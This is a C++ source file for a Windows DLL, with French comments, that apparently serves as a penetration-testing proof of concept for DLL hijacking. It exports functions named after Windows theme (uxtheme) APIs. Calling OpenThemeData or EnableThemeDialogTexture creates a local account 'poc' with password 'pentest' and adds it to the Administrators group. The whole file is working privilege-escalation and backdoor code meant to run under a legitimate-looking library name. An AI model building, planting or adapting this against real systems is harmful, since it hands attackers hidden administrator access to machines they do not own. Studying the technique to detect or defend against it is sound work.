#include <windows.h>
#include <lm.h>
#include <string>

void Main() {
    // Informations sur l'utilisateur à créer
    USER_INFO_1 ui;
    memset(&ui, 0, sizeof(ui)); // Init structure à 0

    WCHAR username[] = L"poc";
    WCHAR password[] = L"pentest";

    ui.usri1_name = username;
    ui.usri1_password = password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_NORMAL_ACCOUNT;
    ui.usri1_script_path = NULL;

    // Création de l'utilisateur

    DWORD dwError;
    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    if (nStatus == NERR_Success) {
        // Ajout de l'utilisateur au groupe Administrateurs
        LOCALGROUP_MEMBERS_INFO_3 groupInfo;
        groupInfo.lgrmi3_domainandname = username;

        nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&groupInfo, 1);
        if (nStatus == NERR_Success) {
            MessageBoxW(0, L"User created and added to Administrator group.", L"Success", 0);
        }
        else {
            MessageBoxW(0, L"Failed to add user to Administrators group.", L"Error", 0);
        }
    }
    else {
        // Conversion du code d'erreur en message lisible
        WCHAR errorMessage[256];
        FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, dwError, 0, errorMessage, sizeof(errorMessage) / sizeof(WCHAR), NULL);
        MessageBoxW(0, errorMessage, L"User creation failed", 0);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) void OpenThemeData() {
        Main();
    }

    __declspec(dllexport) void CloseThemeData() {}
    __declspec(dllexport) void DrawThemeBackground() {}
    __declspec(dllexport) void GetThemeBackgroundContentRect() {}
    __declspec(dllexport) void GetThemePartSize() {}
    __declspec(dllexport) void GetThemeFont() {}
    __declspec(dllexport) void SetWindowTheme() {}
    __declspec(dllexport) void EnableThemeDialogTexture() { Main(); }
    __declspec(dllexport) void DrawThemeParentBackground() {}
    __declspec(dllexport) void GetThemeTransitionDuration() {}
    __declspec(dllexport) void BufferedPaintRenderAnimation() {}
    __declspec(dllexport) void EndBufferedAnimation() {}
    __declspec(dllexport) void BeginBufferedAnimation() {}
    __declspec(dllexport) void BufferedPaintStopAllAnimations() {}
    __declspec(dllexport) void DrawThemeTextEx() {}
}
